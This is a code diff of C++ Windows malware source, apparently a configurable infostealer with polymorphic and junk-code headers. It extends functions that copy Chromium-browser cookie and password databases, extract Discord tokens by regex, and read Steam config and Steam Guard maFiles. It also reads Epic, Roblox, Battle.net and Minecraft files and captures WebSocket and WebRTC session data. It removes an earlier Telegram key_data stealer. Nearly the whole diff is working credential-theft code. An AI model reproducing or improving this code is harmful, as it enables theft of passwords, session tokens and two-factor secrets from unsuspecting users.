@@ -1,5 +1,5 @@
 #include <windows.h>
-#include <ntstatus.h> // Добавлено для NT_SUCCESS
+#include <ntstatus.h> // Для NT_SUCCESS
 #include <iostream>
 #include <fstream>
 #include <sstream>
@@ -39,6 +39,11 @@
 #include "build_key.h"
 #include "polymorphic_code.h"
 #include "junk_code.h"
+
+// Определение NT_SUCCESS, если он отсутствует
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
 
 // Переопределение типов для совместимости
 typedef enum _THREADINFOCLASS {
@@ -1061,18 +1066,148 @@ std::string StealBrowserData() {
         {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
         {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
         {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
-        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"}
+        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"},
+        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\"},
+        {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\"}
     };
 
-    // Кража данных Chromium-браузеров
     for (const auto& browser : browserPaths) {
-        std::string browserData = StealChromiumData(browser.first, browser.second);
-        if (!browserData.empty()) {
-            result += browserData;
+        std::string browserName = browser.first;
+        std::string dbPath = browser.second;
+        if (std::filesystem::exists(dbPath)) {
+            // Копируем базы данных во временные файлы, чтобы избежать блокировки
+            std::string tempCookiesDb = dbPath + "Cookies_temp";
+            std::string tempLoginDb = dbPath + "Login Data_temp";
+            if (g_mainWindow->config.cookies) {
+                std::filesystem::copy_file(dbPath + "Cookies", tempCookiesDb, std::filesystem::copy_options::overwrite_existing);
+            }
+            if (g_mainWindow->config.passwords) {
+                std::filesystem::copy_file(dbPath + "Login Data", tempLoginDb, std::filesystem::copy_options::overwrite_existing);
+            }
+
+            // Извлекаем данные
+            std::string browserData = StealChromiumData(browserName, dbPath);
+            if (!browserData.empty()) {
+                result += browserData;
+            }
+
+            // Удаляем временные файлы
+            if (g_mainWindow->config.cookies && std::filesystem::exists(tempCookiesDb)) {
+                std::filesystem::remove(tempCookiesDb);
+            }
+            if (g_mainWindow->config.passwords && std::filesystem::exists(tempLoginDb)) {
+                std::filesystem::remove(tempLoginDb);
+            }
+
+            // Кража несохраненных данных из кэша
+            std::string cachePath = dbPath + "Cache\\";
+            std::string unsavedData = StealUnsavedBrowserData(browserName, cachePath);
+            if (!unsavedData.empty()) {
+                result += unsavedData;
+            }
+
+            // Захват WebSocket и WebRTC сессий
+            std::string processName = browserName == "Chrome" ? "chrome.exe" :
+                                     browserName == "Edge" ? "msedge.exe" :
+                                     browserName == "Opera" ? "opera.exe" :
+                                     browserName == "OperaGX" ? "opera.exe" :
+                                     browserName == "Yandex" ? "browser.exe" :
+                                     browserName == "Brave" ? "brave.exe" : "";
+            if (!processName.empty()) {
+                std::string wsData = CaptureWebSocketSessions(processName);
+                if (!wsData.empty()) {
+                    result += wsData;
+                }
+                std::string webrtcData = CaptureWebRTCSessions(processName);
+                if (!webrtcData.empty()) {
+                    result += webrtcData;
+                }
+            }
         }
-        std::string unsavedData = StealUnsavedBrowserData(browser.first, browser.second + "Cache\\");
-        if (!unsavedData.empty()) {
-            result += unsavedData;
+    }
+
+    return result;
+}
+
+// Кража токенов Discord
+std::string StealDiscordTokens() {
+    std::string result;
+    if (!g_mainWindow || !g_mainWindow->config.discord) return result;
+
+    char* localAppDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get LOCALAPPDATA path for Discord"));
+        return result;
+    }
+    std::string localAppData(localAppDataPath);
+    free(localAppDataPath);
+
+    char* appDataPath = nullptr;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Discord"));
+        return result;
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
+
+    std::vector<std::string> discordPaths = {
+        localAppData + "\\Discord\\",
+        localAppData + "\\discordcanary\\",
+        localAppData + "\\discordptb\\",
+        appData + "\\Lightcord\\"
+    };
+
+    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
+
+    for (const auto& path : discordPaths) {
+        std::string levelDbPath = path + "Local Storage\\leveldb\\";
+        if (std::filesystem::exists(levelDbPath)) {
+            try {
+                for (const auto& entry : std::filesystem::directory_iterator(levelDbPath)) {
+                    if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
+                        std::ifstream file(entry.path(), std::ios::binary);
+                        if (!file.is_open()) {
+                            std::lock_guard<std::mutex> lock(g_mutex);
+                            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Discord leveldb file: " + entry.path().string()));
+                            continue;
+                        }
+
+                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                        file.close();
+
+                        std::smatch match;
+                        std::string::const_iterator searchStart(content.cbegin());
+                        while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
+                            std::string token = match[0].str();
+                            result += "[Discord] Token: " + token + "\n";
+                            searchStart = match.suffix().first;
+                        }
+                    }
+                }
+            } catch (const std::exception& e) {
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealDiscordTokens: " + std::string(e.what())));
+            }
+        }
+
+        // Кража кэшированных данных
+        std::string cachePath = path + "Cache\\";
+        std::string cacheData = StealAppCacheData("Discord", cachePath);
+        if (!cacheData.empty()) {
+            result += cacheData;
+        }
+
+        // Захват WebSocket и WebRTC сессий
+        std::string wsData = CaptureWebSocketSessions("Discord.exe");
+        if (!wsData.empty()) {
+            result += wsData;
+        }
+        std::string webrtcData = CaptureWebRTCSessions("Discord.exe");
+        if (!webrtcData.empty()) {
+            result += webrtcData;
         }
     }
 
@@ -1082,112 +1217,96 @@ std::string StealBrowserData() {
 // Кража данных Steam
 std::string StealSteamData() {
     std::string result;
-    if (!g_mainWindow || (!g_mainWindow->config.steam && !g_mainWindow->config.steamMAFile)) return result;
+    if (!g_mainWindow || !g_mainWindow->config.steam) return result;
 
+    std::string steamPath;
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Steam registry key"));
-        return result;
-    }
-
-    char steamPath[MAX_PATH] = {0};
-    DWORD pathSize = sizeof(steamPath);
-    if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char value[1024] = {0};
+        DWORD size = sizeof(value);
+        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
+            steamPath = std::string(value);
+        }
         RegCloseKey(hKey);
+    }
+
+    if (steamPath.empty()) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to read SteamPath from registry"));
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Steam installation path not found"));
         return result;
     }
-    RegCloseKey(hKey);
-
-    std::string steamDir(steamPath);
-    if (steamDir.back() != '\\') steamDir += "\\";
 
     // Кража конфигурационных файлов
-    if (g_mainWindow->config.steam) {
-        std::string configPath = steamDir + "config\\loginusers.vdf";
-        if (std::filesystem::exists(configPath)) {
-            std::ifstream configFile(configPath);
-            if (configFile.is_open()) {
-                std::string content((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
-                configFile.close();
-                result += "[Steam] Login Users:\n" + content + "\n";
-                std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Steam loginusers.vdf"));
-            } else {
-                std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Steam loginusers.vdf"));
-            }
-        }
-
-        std::string ssfnPath;
+    std::string configPath = steamPath + "\\config\\";
+    if (std::filesystem::exists(configPath)) {
         try {
-            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
-                if (entry.path().filename().string().find("ssfn") != std::string::npos) {
-                    ssfnPath = entry.path().string();
-                    std::ifstream ssfnFile(ssfnPath, std::ios::binary);
-                    if (ssfnFile.is_open()) {
-                        std::string content((std::istreambuf_iterator<char>(ssfnFile)), std::istreambuf_iterator<char>());
-                        ssfnFile.close();
-                        result += "[Steam] SSFN File (" + ssfnPath + "):\n" + content + "\n";
+            for (const auto& entry : std::filesystem::directory_iterator(configPath)) {
+                if (entry.path().filename().string().find("config.vdf") != std::string::npos ||
+                    entry.path().filename().string().find("loginusers.vdf") != std::string::npos) {
+                    std::ifstream file(entry.path());
+                    if (!file.is_open()) {
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Steam SSFN file: " + ssfnPath));
-                    } else {
-                        std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Steam SSFN file: " + ssfnPath));
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Steam config file: " + entry.path().string()));
+                        continue;
                     }
-                    break;
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+                    result += "[Steam] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                 }
             }
         } catch (const std::exception& e) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Steam directory: " + std::string(e.what())));
-        }
-
-        // Захват WebSocket сессий Steam
-        std::string wsData = CaptureWebSocketSessions("steam.exe");
-        if (!wsData.empty()) {
-            result += "[Steam] WebSocket Data:\n" + wsData + "\n";
-        }
-
-        // Захват WebRTC сессий Steam
-        std::string webrtcData = CaptureWebRTCSessions("steam.exe");
-        if (!webrtcData.empty()) {
-            result += "[Steam] WebRTC Data:\n" + webrtcData + "\n";
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealSteamData (configs): " + std::string(e.what())));
         }
     }
 
-    // Кража MA файлов (Steam Guard)
+    // Кража MA-файлов, если включено
     if (g_mainWindow->config.steamMAFile) {
-        try {
-            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
-                if (entry.path().extension() == ".maFile") {
-                    std::string maFilePath = entry.path().string();
-                    std::ifstream maFile(maFilePath);
-                    if (maFile.is_open()) {
-                        std::string content((std::istreambuf_iterator<char>(maFile)), std::istreambuf_iterator<char>());
-                        maFile.close();
-                        result += "[Steam] MA File (" + maFilePath + "):\n" + content + "\n";
-                        std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Steam MA file: " + maFilePath));
-                    } else {
-                        std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Steam MA file: " + maFilePath));
+        std::string userDataPath = steamPath + "\\userdata\\";
+        if (std::filesystem::exists(userDataPath)) {
+            try {
+                for (const auto& entry : std::filesystem::directory_iterator(userDataPath)) {
+                    if (entry.is_directory()) {
+                        std::string maFilesPath = entry.path().string() + "\\7\\";
+                        if (std::filesystem::exists(maFilesPath)) {
+                            for (const auto& maFile : std::filesystem::directory_iterator(maFilesPath)) {
+                                if (maFile.path().extension() == ".maFile") {
+                                    std::ifstream file(maFile.path());
+                                    if (!file.is_open()) {
+                                        std::lock_guard<std::mutex> lock(g_mutex);
+                                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Steam MA file: " + maFile.path().string()));
+                                        continue;
+                                    }
+                                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                                    file.close();
+                                    result += "[Steam] MA File (" + maFile.path().filename().string() + "):\n" + content + "\n";
+                                }
+                            }
+                        }
                     }
                 }
+            } catch (const std::exception& e) {
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealSteamData (MA files): " + std::string(e.what())));
             }
-        } catch (const std::exception& e) {
-            std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Steam MA files: " + std::string(e.what())));
         }
+    }
+
+    // Захват WebSocket и WebRTC сессий
+    std::string wsData = CaptureWebSocketSessions("Steam.exe");
+    if (!wsData.empty()) {
+        result += wsData;
+    }
+    std::string webrtcData = CaptureWebRTCSessions("Steam.exe");
+    if (!webrtcData.empty()) {
+        result += webrtcData;
     }
 
     return result;
 }
 
 // Кража данных Epic Games
-std::string StealEpicGamesData() {
+std::string StealEpicData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.epic) return result;
 
@@ -1202,47 +1321,35 @@ std::string StealEpicGamesData() {
     free(localAppDataPath);
 
     std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
-    if (!std::filesystem::exists(epicPath)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Epic Games config path not found: " + epicPath));
-        return result;
-    }
-
-    try {
-        for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
-            if (entry.path().filename() == "GameUserSettings.ini") {
-                std::ifstream iniFile(entry.path());
-                if (iniFile.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(iniFile)), std::istreambuf_iterator<char>());
-                    iniFile.close();
-                    result += "[Epic Games] GameUserSettings.ini:\n" + content + "\n";
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Epic Games GameUserSettings.ini"));
-                } else {
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Epic Games GameUserSettings.ini"));
+    if (std::filesystem::exists(epicPath)) {
+        try {
+            for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
+                if (entry.path().filename().string().find("GameUserSettings.ini") != std::string::npos) {
+                    std::ifstream file(entry.path());
+                    if (!file.is_open()) {
+                        std::lock_guard<std::mutex> lock(g_mutex);
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Epic Games config file: " + entry.path().string()));
+                        continue;
+                    }
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+                    result += "[Epic Games] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                 }
             }
+        } catch (const std::exception& e) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealEpicData: " + std::string(e.what())));
         }
+    }
 
-        std::string cachePath = localAppData + "\\EpicGamesLauncher\\Saved\\webcache\\";
-        std::string cacheData = StealAppCacheData("Epic Games", cachePath);
-        if (!cacheData.empty()) {
-            result += "[Epic Games] Cache Data:\n" + cacheData + "\n";
-        }
-
-        std::string wsData = CaptureWebSocketSessions("EpicGamesLauncher.exe");
-        if (!wsData.empty()) {
-            result += "[Epic Games] WebSocket Data:\n" + wsData + "\n";
-        }
-
-        std::string webrtcData = CaptureWebRTCSessions("EpicGamesLauncher.exe");
-        if (!webrtcData.empty()) {
-            result += "[Epic Games] WebRTC Data:\n" + webrtcData + "\n";
-        }
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Epic Games data: " + std::string(e.what())));
+    // Захват WebSocket и WebRTC сессий
+    std::string wsData = CaptureWebSocketSessions("EpicGamesLauncher.exe");
+    if (!wsData.empty()) {
+        result += wsData;
+    }
+    std::string webrtcData = CaptureWebRTCSessions("EpicGamesLauncher.exe");
+    if (!webrtcData.empty()) {
+        result += webrtcData;
     }
 
     return result;
@@ -1264,47 +1371,35 @@ std::string StealRobloxData() {
     free(appDataPath);
 
     std::string robloxPath = appData + "\\Roblox\\";
-    if (!std::filesystem::exists(robloxPath)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Roblox path not found: " + robloxPath));
-        return result;
-    }
-
-    try {
-        for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath)) {
-            if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos) {
-                std::ifstream settingsFile(entry.path());
-                if (settingsFile.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(settingsFile)), std::istreambuf_iterator<char>());
-                    settingsFile.close();
-                    result += "[Roblox] GlobalBasicSettings:\n" + content + "\n";
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Roblox GlobalBasicSettings: " + entry.path().string()));
-                } else {
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Roblox GlobalBasicSettings: " + entry.path().string()));
+    if (std::filesystem::exists(robloxPath)) {
+        try {
+            for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath)) {
+                if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos) {
+                    std::ifstream file(entry.path());
+                    if (!file.is_open()) {
+                        std::lock_guard<std::mutex> lock(g_mutex);
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Roblox config file: " + entry.path().string()));
+                        continue;
+                    }
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+                    result += "[Roblox] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                 }
             }
+        } catch (const std::exception& e) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealRobloxData: " + std::string(e.what())));
         }
+    }
 
-        std::string cachePath = robloxPath + "HttpCache\\";
-        std::string cacheData = StealAppCacheData("Roblox", cachePath);
-        if (!cacheData.empty()) {
-            result += "[Roblox] Cache Data:\n" + cacheData + "\n";
-        }
-
-        std::string wsData = CaptureWebSocketSessions("RobloxPlayerBeta.exe");
-        if (!wsData.empty()) {
-            result += "[Roblox] WebSocket Data:\n" + wsData + "\n";
-        }
-
-        std::string webrtcData = CaptureWebRTCSessions("RobloxPlayerBeta.exe");
-        if (!webrtcData.empty()) {
-            result += "[Roblox] WebRTC Data:\n" + webrtcData + "\n";
-        }
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Roblox data: " + std::string(e.what())));
+    // Захват WebSocket и WebRTC сессий
+    std::string wsData = CaptureWebSocketSessions("RobloxPlayerBeta.exe");
+    if (!wsData.empty()) {
+        result += wsData;
+    }
+    std::string webrtcData = CaptureWebRTCSessions("RobloxPlayerBeta.exe");
+    if (!webrtcData.empty()) {
+        result += webrtcData;
     }
 
     return result;
@@ -1325,165 +1420,36 @@ std::string StealBattleNetData() {
     std::string appData(appDataPath);
     free(appDataPath);
 
-    std::string battleNetPath = appData + "\\Battle.net\\";
-    if (!std::filesystem::exists(battleNetPath)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Battle.net path not found: " + battleNetPath));
-        return result;
-    }
-
-    try {
-        for (const auto& entry : std::filesystem::directory_iterator(battleNetPath)) {
-            if (entry.path().filename() == "Battle.net.config") {
-                std::ifstream configFile(entry.path());
-                if (configFile.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
-                    configFile.close();
-                    result += "[Battle.net] Config:\n" + content + "\n";
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Battle.net config"));
-                } else {
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Battle.net config"));
-                }
-            }
-        }
-
-        std::string cachePath = battleNetPath + "Cache\\";
-        std::string cacheData = StealAppCacheData("Battle.net", cachePath);
-        if (!cacheData.empty()) {
-            result += "[Battle.net] Cache Data:\n" + cacheData + "\n";
-        }
-
-        std::string wsData = CaptureWebSocketSessions("Battle.net.exe");
-        if (!wsData.empty()) {
-            result += "[Battle.net] WebSocket Data:\n" + wsData + "\n";
-        }
-
-        std::string webrtcData = CaptureWebRTCSessions("Battle.net.exe");
-        if (!webrtcData.empty()) {
-            result += "[Battle.net] WebRTC Data:\n" + webrtcData + "\n";
-        }
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Battle.net data: " + std::string(e.what())));
-    }
-
-    return result;
-}
-
-// Кража данных Discord
-std::string StealDiscordData() {
-    std::string result;
-    if (!g_mainWindow || !g_mainWindow->config.discord) return result;
-
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Discord"));
-        return result;
-    }
-    std::string appData(appDataPath);
-    free(appDataPath);
-
-    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
-    if (!std::filesystem::exists(discordPath)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Discord path not found: " + discordPath));
-        return result;
-    }
-
-    try {
-        for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
-            if (entry.path().extension() == ".ldb") {
-                std::ifstream ldbFile(entry.path(), std::ios::binary);
-                if (ldbFile.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
-                    ldbFile.close();
-
-                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
-                    std::smatch match;
-                    std::string::const_iterator searchStart(content.cbegin());
-                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
-                        result += "[Discord] Token: " + match[0].str() + "\n";
-                        searchStart = match.suffix().first;
+    std::string battlenetPath = appData + "\\Battle.net\\";
+    if (std::filesystem::exists(battlenetPath)) {
+        try {
+            for (const auto& entry : std::filesystem::directory_iterator(battlenetPath)) {
+                if (entry.path().filename().string().find("config") != std::string::npos) {
+                    std::ifstream file(entry.path());
+                    if (!file.is_open()) {
+                        std::lock_guard<std::mutex> lock(g_mutex);
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Battle.net config file: " + entry.path().string()));
+                        continue;
                     }
-                } else {
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Discord .ldb file: " + entry.path().string()));
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+                    result += "[Battle.net] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                 }
             }
+        } catch (const std::exception& e) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealBattleNetData: " + std::string(e.what())));
         }
-
-        std::string wsData = CaptureWebSocketSessions("Discord.exe");
-        if (!wsData.empty()) {
-            result += "[Discord] WebSocket Data:\n" + wsData + "\n";
-        }
-
-        std::string webrtcData = CaptureWebRTCSessions("Discord.exe");
-        if (!webrtcData.empty()) {
-            result += "[Discord] WebRTC Data:\n" + webrtcData + "\n";
-        }
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Discord data: " + std::string(e.what())));
     }
 
-    return result;
-}
-
-// Кража данных Telegram
-std::string StealTelegramData() {
-    std::string result;
-    if (!g_mainWindow || !g_mainWindow->config.telegram) return result;
-
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Telegram"));
-        return result;
+    // Захват WebSocket и WebRTC сессий
+    std::string wsData = CaptureWebSocketSessions("Battle.net.exe");
+    if (!wsData.empty()) {
+        result += wsData;
     }
-    std::string appData(appDataPath);
-    free(appDataPath);
-
-    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
-    if (!std::filesystem::exists(telegramPath)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Telegram path not found: " + telegramPath));
-        return result;
-    }
-
-    try {
-        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
-            if (entry.path().filename().string().find("key_data") != std::string::npos) {
-                std::ifstream keyFile(entry.path(), std::ios::binary);
-                if (keyFile.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());
-                    keyFile.close();
-                    result += "[Telegram] Key Data:\n" + content + "\n";
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Telegram key_data"));
-                } else {
-                    std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Telegram key_data: " + entry.path().string()));
-                }
-            }
-        }
-
-        std::string wsData = CaptureWebSocketSessions("Telegram.exe");
-        if (!wsData.empty()) {
-            result += "[Telegram] WebSocket Data:\n" + wsData + "\n";
-        }
-
-        std::string webrtcData = CaptureWebRTCSessions("Telegram.exe");
-        if (!webrtcData.empty()) {
-            result += "[Telegram] WebRTC Data:\n" + webrtcData + "\n";
-        }
-    } catch (const std::exception& e) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Telegram data: " + std::string(e.what())));
+    std::string webrtcData = CaptureWebRTCSessions("Battle.net.exe");
+    if (!webrtcData.empty()) {
+        result += webrtcData;
     }
 
     return result;
@@ -1505,65 +1471,156 @@ std::string StealMinecraftData() {
     free(appDataPath);
 
     std::string minecraftPath = appData + "\\.minecraft\\";
-    if (!std::filesystem::exists(minecraftPath)) {
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Minecraft path not found: " + minecraftPath));
-        return result;
+    if (std::filesystem::exists(minecraftPath)) {
+        try {
+            for (const auto& entry : std::filesystem::directory_iterator(minecraftPath)) {
+                if (entry.path().filename().string() == "launcher_profiles.json" ||
+                    entry.path().filename().string() == "usercache.json") {
+                    std::ifstream file(entry.path());
+                    if (!file.is_open()) {
+                        std::lock_guard<std::mutex> lock(g_mutex);
+                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Minecraft file: " + entry.path().string()));
+                        continue;
+                    }
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+                    result += "[Minecraft] File (" + entry.path().filename().string() + "):\n" + content + "\n";
+                }
+            }
+        } catch (const std::exception& e) {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealMinecraftData: " + std::string(e.what())));
+        }
     }
 
-    try {
-        std::string launcherProfilesPath = minecraftPath + "launcher_profiles.json";
-        if (std::filesystem::exists(launcherProfilesPath)) {
-            std::ifstream profilesFile(launcherProfilesPath);
-            if (profilesFile.is_open()) {
-                std::string content((std::istreambuf_iterator<char>(profilesFile)), std::istreambuf_iterator<char>());
-                profilesFile.close();
-                result += "[Minecraft] Launcher Profiles:\n" + content + "\n";
-                std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Minecraft launcher_profiles.json"));
-            } else {
-                std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Minecraft launcher_profiles.json"));
-            }
-        }
+    // Захват WebSocket и WebRTC сессий
+    std::string wsData = CaptureWebSocketSessions("Minecraft.exe");
+    if (!wsData.empty()) {
+        result += wsData;
+    }
+    std::string webrtcData = CaptureWebRTCSessions("Minecraft.exe");
+    if (!webrtcData.empty()) {
+        result += webrtcData;
+    }
 
-        std::string logsPath = minecraftPath + "logs\\";
-        if (std::filesystem::exists(logsPath)) {
-            for (const auto& entry : std::filesystem::directory_iterator(logsPath)) {
-                if (entry.path().extension() == ".log") {
-                    std::ifstream logFile(entry.path());
-                    if (logFile.is_open()) {
-                        std::string content((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
-                        logFile.close();
